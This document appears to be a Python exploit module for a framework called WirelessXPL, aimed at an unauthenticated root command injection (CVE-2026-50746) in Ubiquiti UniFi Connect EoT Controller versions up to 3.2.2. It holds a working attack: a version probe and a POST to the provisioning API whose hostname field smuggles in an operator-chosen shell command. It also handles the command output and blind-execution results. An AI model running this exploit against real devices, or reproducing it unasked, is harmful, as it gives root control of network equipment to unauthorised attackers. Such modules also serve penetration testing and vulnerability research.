# Author: André Henrique (LinkedIn/X: @mrhenrike)
import json
import ssl
import urllib.request
import urllib.error

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Ubiquiti UniFi Connect EoT Controller Command Injection (CVE-2026-50746).

    The UniFi Connect EoT (Everything-over-Touchscreen) Controller <= 3.2.2
    exposes an unauthenticated API endpoint for device provisioning at
    /api/v1/devices/provision.  The ``hostname`` parameter in the JSON body
    is passed unsanitized to a shell command, allowing OS command injection
    as root.

    No authentication is required: the provisioning endpoint is designed to
    accept requests from unconfigured devices on the local network, but the
    lack of input validation allows any network-adjacent attacker to inject
    arbitrary commands.

    CVSS v3.1: 10.0 (Critical), AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Ubiquiti UniFi Connect EoT Controller Command Injection (CVE-2026-50746)",
        "description": (
            "Exploits CVE-2026-50746 in Ubiquiti UniFi Connect EoT Controller "
            "<= 3.2.2. The device provisioning API (/api/v1/devices/provision) "
            "accepts a hostname parameter that is passed unsanitized to a shell "
            "command, enabling unauthenticated OS command injection as root."
        ),
        "authors": (
            "Researcher (discovery / CVE)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-50746",
            "https://community.ui.com/releases",
        ),
        "devices": (
            "Ubiquiti UniFi Connect EoT Controller <= 3.2.2",
            "Ubiquiti UniFi Connect Display",
            "Ubiquiti UniFi Connect Display Cast",
        ),
    }

    target = OptIP("", "Target IPv4 address of the UniFi Connect controller")
    port = OptPort(443, "API HTTPS port (default 443)")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to execute via the injection")

    _PROVISION_ENDPOINT = "/api/v1/devices/provision"
    _INFO_ENDPOINT = "/api/v1/system/info"

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _http_request(
        self,
        method: str,
        path: str,
        data: bytes | None = None,
        headers: dict | None = None,
    ) -> tuple[int, bytes]:
        url = f"https://{self.target}:{self.port}{path}"
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", "WirelessXPL/2.2")
        req.add_header("Accept", "application/json")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = self._build_ssl_context()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except (urllib.error.URLError, TimeoutError, OSError):
            return 0, b""

    @mute
    def check(self) -> bool:
        """Probe the controller for the provisioning API endpoint."""
        try:
            status, body = self._http_request("GET", self._INFO_ENDPOINT)
            if status == 0:
                return False
            if status == 200:
                try:
                    info = json.loads(body)
                    version = info.get("version", "")
                    if version:
                        parts = version.split(".")
                        if len(parts) >= 2:
                            major, minor = int(parts[0]), int(parts[1])
                            patch = int(parts[2]) if len(parts) > 2 else 0
                            if major < 3 or (major == 3 and minor < 2) or (major == 3 and minor == 2 and patch <= 2):
                                return True
                except (json.JSONDecodeError, ValueError, IndexError):
                    pass

            status2, _ = self._http_request("OPTIONS", self._PROVISION_ENDPOINT)
            return status2 in (200, 204, 405)
        except Exception:
            return False

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to be a "
                f"vulnerable UniFi Connect EoT Controller"
            )
            return

        print_success("Vulnerable UniFi Connect endpoint detected; attempting injection")
        self._exploit()

    def _exploit(self) -> None:
        injected_hostname = f"wxf-probe$(IFS=_;cmd={self.command};$cmd)"
        payload = json.dumps({
            "hostname": injected_hostname,
            "mac": "AA:BB:CC:DD:EE:FF",
            "model": "UCG-Ultra",
            "firmware": "1.0.0",
        }).encode()

        print_status(
            f"Sending provisioning request with injected command to "
            f"POST {self._PROVISION_ENDPOINT}"
        )
        status, body = self._http_request(
            "POST",
            self._PROVISION_ENDPOINT,
            data=payload,
            headers={"Content-Type": "application/json"},
        )

        if status == 0:
            print_error("No response from target; connection failed or timed out")
            return

        print_info(f"HTTP response: {status}")

        if status in (200, 201, 202):
            try:
                result = json.loads(body)
                output = result.get("output", result.get("message", ""))
                if output:
                    print_success("Command injection successful. Output:")
                    for line in str(output).splitlines():
                        print_info(f"  {line}")
                else:
                    print_success(
                        f"Provisioning accepted (HTTP {status}); "
                        f"command likely executed (blind injection). "
                        f"Verify with an out-of-band callback."
                    )
            except (json.JSONDecodeError, ValueError):
                print_success(f"Command injection likely executed (HTTP {status})")
                if body:
                    print_info(f"  Raw: {body[:256].decode(errors='replace')}")
        elif status == 400:
            print_info(
                "HTTP 400: input validation may partially sanitize; "
                "try alternate injection vectors"
            )
        elif status == 404:
            print_error(
                "Provisioning endpoint not found (HTTP 404). "
                "This firmware version may not include the vulnerable feature."
            )
        else:
            print_info(f"Unexpected response (HTTP {status}): {body[:256]}")
